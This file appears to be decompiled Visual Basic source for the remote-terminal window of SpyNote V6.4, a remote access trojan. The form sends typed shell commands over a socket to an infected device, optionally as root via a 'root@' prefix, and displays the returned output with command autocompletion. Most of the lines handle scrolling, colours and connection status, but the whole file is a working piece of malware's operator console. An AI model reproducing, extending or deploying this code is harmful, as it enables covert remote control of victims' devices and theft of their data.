Imports Microsoft.VisualBasic.CompilerServices
Imports System.IO
Imports System.Threading
Imports SpyNote_V6._4.SN
Imports SpyNote_V6._4.SN.SpyNote.Stores
Imports SpyNote_V6._4.SN.Sockets.SpyNote.Client

Public Class Terminal
    Public TClient As SocketClient

    Private x As Integer

    Private y As Integer

    Private bDown As Boolean

    Private ce As Integer

    Public inScr As Integer
    Public Sub New()
        Me.bDown = False
        Me.inScr = 0
        Me.InitializeComponent()
    End Sub
    Private Sub GridViewoVerticalScrollBar0()
        Dim columnsWidth As Integer = Me.ViewManager.Columns.GetColumnsWidth(DataGridViewElementStates.Visible)
        Dim flag As Boolean = columnsWidth >= Me.ViewManager.Width
        If flag Then
            Me.VisualStudioHorizontalScrollBar1.Maximum = columnsWidth - Me.ViewManager.Width
        Else
            Me.VisualStudioHorizontalScrollBar1.Maximum = columnsWidth
        End If
        Dim flag2 As Boolean = columnsWidth > Me.ViewManager.Width
        If flag2 Then
            Dim flag3 As Boolean = Not Me.VisualStudioHorizontalScrollBar1.Visible
            If flag3 Then
                Me.VisualStudioHorizontalScrollBar1.Visible = True
            End If
        Else
            Dim flag4 As Boolean = Me.VisualStudioHorizontalScrollBar1.Visible > False
            If flag4 Then
                Me.VisualStudioHorizontalScrollBar1.Visible = False
            End If
        End If
        Dim flag5 As Boolean = Me.ViewManager.Rows.Count > 0
        If flag5 Then
            Dim num As Integer = Me.ViewManager.Rows.Count * Me.ViewManager.Rows(0).Height
            Dim flag6 As Boolean = num > Me.ViewManager.Height
            If flag6 Then
                Dim flag7 As Boolean = Not Me.VisualStudioVerticalScrollBar1.Visible
                If flag7 Then
                    Me.VisualStudioVerticalScrollBar1.Visible = True
                End If
            Else
                Dim flag8 As Boolean = Me.VisualStudioVerticalScrollBar1.Visible > False
                If flag8 Then
                    Me.VisualStudioVerticalScrollBar1.Visible = False
                End If
            End If
        Else
            Dim flag9 As Boolean = Me.VisualStudioVerticalScrollBar1.Visible > False
            If flag9 Then
                Me.VisualStudioVerticalScrollBar1.Visible = False
            End If
        End If
    End Sub
    Protected Overrides Function ProcessCmdKey(ByRef msg As Message, ByVal keyData As Keys) As Boolean
        Dim flag As Boolean
        Try
            If (msg.WParam.ToInt32() = 13) Then
                Me.ViewManager.EndEdit()
                Dim str As String = ""
                If (Me.ViewManager.Rows.Count > 0) Then
                    str = Conversions.ToString(Me.ViewManager.Rows(Me.ViewManager.Rows.Count - 1).Cells(1).Value)
                    If (Not str.Trim().StartsWith("root@")) Then
                        If (str.ToLower().Contains("su ") Or str.Trim().ToLower().Contains(" su ") Or str.Trim().ToLower().Contains(" su") Or Operators.CompareString(str.ToLower().Trim(), "su", False) = 0) Then
                            flag = True
                            Return flag
                        End If
                    End If
                    Me.ViewManager.Rows(Me.ViewManager.Rows.Count - 1).Cells(1).Value = String.Concat(">>>>>>>>>>>>>>> ", str)
                    Me.ViewManager.Rows(Me.ViewManager.Rows.Count - 1).Cells(1).Tag = "No"
                    Me.ViewManager.Rows(Me.ViewManager.Rows.Count - 1).Cells(0).Tag = "-"
                    Me.ViewManager.Rows(Me.ViewManager.Rows.Count - 1).Cells(1).Style.ForeColor = Color.FromArgb(255, 167, 163, 162)
                    Me.ViewManager.CurrentCell = Me.ViewManager.Rows(Me.ViewManager.RowCount - 1).Cells(0)
                    If (Not str.Trim().StartsWith("root@")) Then
                        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(37)), Data.SplitData, str, Data.SplitData, "Nothing"}))
                    Else
                        Dim str1 As String = str.Replace("root@", "")
                        Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(37)), Data.SplitData, str1, Data.SplitData, "root@"}))
                    End If
                End If
                Me.ViewManager.Focus()
                Me.inScr = -1
                flag = True
            ElseIf (msg.WParam.ToInt32() <> 40) Then
                flag = MyBase.ProcessCmdKey(msg, keyData)
                Return flag
            ElseIf (Me.bDown) Then
                If (My.Forms.Spell.ViewManager.Rows.Count > 0) Then
                    Me.ViewManager.EndEdit()
                    Dim str2 As String = ""
                    If (Me.ViewManager.Rows.Count > 0) Then
                        If (Me.ViewManager.Rows(Me.ViewManager.Rows.Count - 1).Cells(1).Value IsNot Nothing) Then
                            str2 = Me.ViewManager.Rows(Me.ViewManager.Rows.Count - 1).Cells(1).Value.ToString()
                            Dim str3 As String = ""
                            Dim length As Integer = str2.Length - 1
                            While length >= 0
                                If (Operators.CompareString(Conversions.ToString(str2(length)), Strings.Space(1), False) <> 0) Then
                                    str3 = String.Concat(str3, Conversions.ToString(str2(length)))
                                    length = length + -1
                                ElseIf (length <> str2.Length - 1) Then
                                    Exit While
                                Else
                                    flag = True
                                    Return flag
                                End If
                            End While
                            Dim str4 As String = Strings.StrReverse(str3)
                            Dim count As Integer = My.Forms.Spell.ViewManager.Rows.Count - 1
                            Dim num As Integer = -1
                            Dim num1 As Integer = 0
                            Dim flag1 As Boolean = False
                            While count >= num1
                                If (num1 > count) Then
                                    Exit While
                                ElseIf (Not My.Forms.Spell.ViewManager.Rows(num1).Cells(1).Value.ToString().ToUpper().StartsWith(str4.ToUpper())) Then
                                    num1 = num1 + 1
                                Else
                                    Dim arrays As Array = DirectCast((New Object() {My.Forms.Spell.ViewManager.Rows(num1).Cells(1).Value.ToString(), str4.Length}), Array)
                                    My.Forms.Spell.tag01 = str4
                                    My.Forms.Spell.ViewManager.Rows(num1).Tag = arrays
                                    num = num1
                                    flag1 = True
                                    Exit While
                                End If
                            End While
                            If (flag1) Then
                                Dim position As System.Drawing.Point = System.Windows.Forms.Cursor.Position
                                Dim point As System.Drawing.Point = New System.Drawing.Point(position.X, position.Y)
                                My.Forms.Spell.Location = point
                                My.Forms.Spell.Visible = True
                                My.Forms.Spell.Trans.Enabled = True
                                My.Forms.Spell.Show()
                                If (num <> -1) Then
                                    My.Forms.Spell.indx = num
                                End If
                            Else
                                flag = True
                                Return flag
                            End If
                        Else
                            flag = True
                            Return flag
                        End If
                    End If
                End If
                flag = True
            Else
                flag = MyBase.ProcessCmdKey(msg, keyData)
            End If
        Catch exception As System.Exception
            flag = MyBase.ProcessCmdKey(msg, keyData)
            Return flag
        End Try
        Return flag
    End Function

    Private Function RandomColor() As Color
        Dim random As System.Random = New System.Random()
        Return Color.FromArgb(222, 222, 222)
    End Function

    Private Sub RefScrolls()
        Dim num As Integer = 0
        If (MyBase.Visible) Then
            SyncLock Me.ViewManager
                If (Me.ViewManager.Rows.Count > 0) Then
                    If (Me.ViewManager.Rows.Count * Me.ViewManager.Rows(0).Height > Me.ViewManager.Height) Then
                        num = CInt(Math.Round(CDbl(Me.ViewManager.Height) / CDbl(Me.ViewManager.Rows(0).Height))) - 2
                        If (num < 0) Then
                            num = 0
                        End If
                    End If
                End If
                Me.VisualStudioVerticalScrollBar1.Maximum = Me.ViewManager.Rows.Count - num
                Me.GridViewoVerticalScrollBar0()
                If (Me.inScr = -1) Then
                    Me.inScr = 0
                    Me.ToEndViewManager()
                End If
            End SyncLock
        End If
    End Sub

    Public Sub TData(ByVal Ay As Array)
        Dim count As Integer
        Try
            If (Operators.CompareString(CStr(Ay.GetValue(0)), Store.BFF(Store.buff, CLng(84)), False) = 0) Then
                Dim strArrays As String() = CStr(Ay.GetValue(1)).Split(New String() {Data.SplitLines}, StringSplitOptions.RemoveEmptyEntries)
                Dim length As Integer = CInt(strArrays.Length) - 1
                Dim num As Integer = 0
                Do
                    Dim strArrays1 As String() = strArrays(num).Split(New String() {Data.SplitArray}, StringSplitOptions.RemoveEmptyEntries)
                    Dim rows As DataGridViewRowCollection = Me.ViewManager.Rows
                    Dim str(1) As Object
                    count = Me.ViewManager.Rows.Count
                    str(0) = count.ToString()
                    str(1) = strArrays1(0)
                    rows.Add(str)
                    If (strArrays1(0).ToString().StartsWith("error! >")) Then
                        Me.ViewManager.Rows(Me.ViewManager.Rows.Count - 1).Cells(1).Style.ForeColor = Color.FromArgb(255, 119, 87, 89)
                    ElseIf (Operators.CompareString(strArrays1(0).ToString(), "return null", False) <> 0) Then
                        Me.ViewManager.Rows(Me.ViewManager.Rows.Count - 1).Cells(1).Style.ForeColor = Me.RandomColor()
                    Else
                        Me.ViewManager.Rows(Me.ViewManager.Rows.Count - 1).Cells(1).Style.ForeColor = Color.FromArgb(255, 239, 242, 132)
                    End If
                    Me.ViewManager.Rows(Me.ViewManager.Rows.Count - 1).Cells(1).Tag = "No"
                    num = num + 1
                Loop While num <= length
                If (Operators.CompareString(Ay.GetValue(2).ToString(), "0", False) <> 0) Then
                    Dim dataGridViewRowCollections As DataGridViewRowCollection = Me.ViewManager.Rows
                    Dim objArray(2) As Object
                    count = Me.ViewManager.Rows.Count
                    objArray(0) = count.ToString()
                    objArray(1) = String.Concat("Fail", Strings.Space(1), Ay.GetValue(2).ToString())
                    dataGridViewRowCollections.Add(objArray)
                    Me.ViewManager.Rows(Me.ViewManager.Rows.Count - 1).Cells(1).Style.ForeColor = Color.Pink
                Else
                    Dim rows1 As DataGridViewRowCollection = Me.ViewManager.Rows
                    Dim str1(1) As Object
                    count = Me.ViewManager.Rows.Count
                    str1(0) = count.ToString()
                    str1(1) = "Completed"
                    rows1.Add(str1)
                    Me.ViewManager.Rows(Me.ViewManager.Rows.Count - 1).Cells(1).Style.ForeColor = Color.FromArgb(78, 201, 176)
                End If
                Dim dataGridViewRowCollections1 As DataGridViewRowCollection = Me.ViewManager.Rows
                Dim objArray1(1) As Object
                count = Me.ViewManager.Rows.Count
                objArray1(0) = count.ToString()
                objArray1(1) = ""
                dataGridViewRowCollections1.Add(objArray1)
                Me.ViewManager.Rows(Me.ViewManager.Rows.Count - 1).Cells(1).Tag = "Yes"
                Me.inScr = -1
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub Terminal_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        MyBase.Icon = New System.Drawing.Icon(String.Concat(Store.Resources(1), "\Icons\window\win\8.ico"))
        Me.ViewManager.ContextMenuStrip = ContextGriedView.ContextMenuContextGriedView
        Dim thread As System.Threading.Thread = New System.Threading.Thread(New ThreadStart(AddressOf Me.tSpell))
        thread.Start()
        Me.TScrolls.Interval = Store.TScrollsInterval
        Me.TProgressBar.Interval = Store.TProgressBarInterval
        Me.TScrolls.Enabled = True
        Me.TProgressBar.Enabled = True
        Me.Trans.Interval = Store.transparency
        Me.Trans.Enabled = True
    End Sub

    Private Sub ToEndViewManager()
        Try
            If (Me.ViewManager.FirstDisplayedScrollingRowIndex >= 0) Then
                Me.ViewManager.FirstDisplayedScrollingRowIndex = Me.ViewManager.RowCount - 1
                Me.ViewManager.CurrentCell = Me.ViewManager.Rows(Me.ViewManager.RowCount - 1).Cells(Me.ce)
                Me.ViewManager.Rows(Me.ViewManager.RowCount - 1).Selected = True
                If (Me.ce = 0) Then
                    Me.ce = 1
                End If
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub TProgressBar_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TProgressBar.Tick
        If (Me.TClient Is Nothing) Then
            Me.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(MyBase.Tag, Strings.Space(1)), "-> Connection Lost ..."))
            If (Me.ProgressBar1.Value <> 100) Then
                Me.ProgressBar1.Value = 100
                If (Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)) Then
                    Me.ProgressBar1.Colour0 = Color.FromArgb(128, 128, 128)
                    Me.ProgressBar1.Colour1 = Color.FromArgb(88, 88, 88)
                End If
            End If
        ElseIf (Not Me.TClient.IsClose) Then
            If (Me.Text <> MyBase.Tag) Then
                Me.Text = Conversions.ToString(MyBase.Tag)
            End If
            If (Me.ProgressBar1.Colour1 <> Color.FromArgb(140, 140, 140)) Then
                Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)
                Me.ProgressBar1.Colour0 = Color.FromArgb(140, 140, 140)
            End If
            Me.ProgressBar1.Value = Me.TClient.mProgressBar(Store.BFF(Store.buff, CLng(37)), "null")
        Else
            Me.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(MyBase.Tag, Strings.Space(1)), "-> Connection Lost ..."))
            If (Me.ProgressBar1.Value <> 100) Then
                Me.ProgressBar1.Value = 100
                If (Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)) Then
                    Me.ProgressBar1.Colour0 = Color.FromArgb(128, 128, 128)
                    Me.ProgressBar1.Colour1 = Color.FromArgb(88, 88, 88)
                End If
            End If
        End If
    End Sub

    Private Sub Trans_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Trans.Tick
        If (MyBase.Opacity = 1) Then
            Me.Trans.Enabled = False
        Else
            MyBase.Opacity = MyBase.Opacity + 0.1
        End If
    End Sub

    Private Sub TScrolls_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TScrolls.Tick
        Me.RefScrolls()
    End Sub

    Private Sub tSpell()
        Dim str As String
        Try
            If (Not MyBase.InvokeRequired) Then
                My.Forms.Spell.Show()
                Dim streamReader As System.IO.StreamReader = New System.IO.StreamReader(String.Concat(Store.Resources(1), "\Imports\terminal\tr.inf"))
                Do
                    str = streamReader.ReadLine().Trim()
                    If (Operators.CompareString(str.Trim(), "", False) = 0) Then
                        Continue Do
                    End If
                    Dim arrays As Array = DirectCast((New Object() {str, -1}), Array)
                    If (str.Trim().StartsWith("root@")) Then
                        My.Forms.Spell.ViewManager.Rows.Add(New Object() {Store.Bitmap_0("terminal\su"), str})
                    Else
                        My.Forms.Spell.ViewManager.Rows.Add(New Object() {Store.Bitmap_0("terminal\c"), str})
                    End If
                    Dim count As Integer = My.Forms.Spell.ViewManager.Rows.Count - 1
                    My.Forms.Spell.ViewManager.Rows(count).Tag = arrays
                Loop While str IsNot Nothing
                streamReader.Close()
            Else
                MyBase.Invoke(New Terminal.Delegate0(Sub(a0 As Object) Me.tSpell()), New Object(0) {})
                Return
            End If
        Catch exception As System.Exception
        End Try
    End Sub

    Private Sub ViewManager_CellMouseClick(ByVal sender As Object, ByVal e As DataGridViewCellMouseEventArgs) Handles ViewManager.CellMouseClick
        If (e.RowIndex <> -1) Then
            Me.VisualStudioVerticalScrollBar1.Llen = If(e.RowIndex >= Me.VisualStudioVerticalScrollBar1.Maximum, Me.VisualStudioVerticalScrollBar1.Maximum, e.RowIndex)
        End If
    End Sub

    Private Sub ViewManager_EditModeChanged(ByVal sender As Object, ByVal e As DataGridViewCellCancelEventArgs) Handles ViewManager.EditModeChanged
        Dim rowIndex As Integer = e.RowIndex
        Dim columnIndex As Integer = e.ColumnIndex
        If (rowIndex <> -1 And columnIndex <> -1) Then
            If (Not (Me.ViewManager.Rows.Count - 1 = rowIndex And columnIndex = 1)) Then
                Me.bDown = False
                If (Me.Column2.AutoSizeMode <> DataGridViewAutoSizeColumnMode.AllCells) Then
                    Me.Column2.AutoSizeMode = DataGridViewAutoSizeColumnMode.AllCells
                End If
                e.Cancel = True
            Else
                If (Operators.ConditionalCompareObjectEqual(Me.ViewManager.Rows(rowIndex).Cells(1).Tag, "No", False)) Then
                    e.Cancel = True
                    Return
                End If
                Me.bDown = True
                If (Me.Column2.AutoSizeMode <> DataGridViewAutoSizeColumnMode.Fill) Then
                    Me.Column2.AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill
                End If
                Me.ViewManager.Rows(rowIndex).Cells(1).Style.ForeColor = Color.FromArgb(255, 197, 193, 192)
                e.Cancel = False
            End If
        End If
    End Sub

    Private Sub ViewManager_MouseWheel(ByVal sender As Object, ByVal e As MouseEventArgs) Handles ViewManager.MouseWheel
        If (e.Delta <= 1) Then
            Dim visualStudioVerticalScrollBar1 As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar1
            visualStudioVerticalScrollBar1.Value = visualStudioVerticalScrollBar1.Value + 1
        Else
            Dim value As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar1
            value.Value = value.Value - 1
        End If
    End Sub

    Private Sub ViewManager_RowStateChanged(ByVal sender As Object, ByVal e As DataGridViewRowStateChangedEventArgs) Handles ViewManager.RowStateChanged
        If (e.StateChanged = DataGridViewElementStates.Selected) Then
            Me.VisualStudioVerticalScrollBar1.Llen = If(e.Row.Index >= Me.VisualStudioVerticalScrollBar1.Maximum, Me.VisualStudioVerticalScrollBar1.Maximum, e.Row.Index)
        End If
    End Sub

    Private Sub ViewManager_Scroll(ByVal sender As Object, ByVal e As ScrollEventArgs) Handles ViewManager.Scroll
        If (e.ScrollOrientation <> ScrollOrientation.HorizontalScroll) Then
            Me.y = e.NewValue
            Me.VisualStudioVerticalScrollBar1.Value = Me.y
        Else
            Me.x = e.NewValue
            Me.VisualStudioHorizontalScrollBar1.Value = Me.x
        End If
    End Sub

    Private Sub ViewManager_Sorted(ByVal sender As Object, ByVal e As EventArgs) Handles ViewManager.Sorted
        Me.VisualStudioVerticalScrollBar1.Llen = -1
    End Sub

    Private Sub VisualStudioHorizontalScrollBar1_Scroll_1(ByVal sender As Object) Handles VisualStudioHorizontalScrollBar1.Scroll
        Try
            Dim horizontalScrollingOffset As Integer = Me.ViewManager.HorizontalScrollingOffset
            Dim flag As Boolean = horizontalScrollingOffset <> -1
            If flag Then
                Me.ViewManager.HorizontalScrollingOffset = Me.VisualStudioHorizontalScrollBar1.Value
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub VisualStudioVerticalScrollBar1_Scroll_1(ByVal sender As Object) Handles VisualStudioVerticalScrollBar1.Scroll
        Try
            If (Me.ViewManager.FirstDisplayedScrollingRowIndex <> -1) Then
                Me.ViewManager.FirstDisplayedScrollingRowIndex = Me.VisualStudioVerticalScrollBar1.Value
            End If
        Catch exception As System.Exception
            ProjectData.SetProjectError(exception)
            If (Me.ViewManager.FirstDisplayedScrollingRowIndex >= 0) Then
                Me.ViewManager.FirstDisplayedScrollingRowIndex = Me.ViewManager.RowCount - 1
            End If
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Public Delegate Sub Delegate0(ByVal ParametersObject As Object)
End Class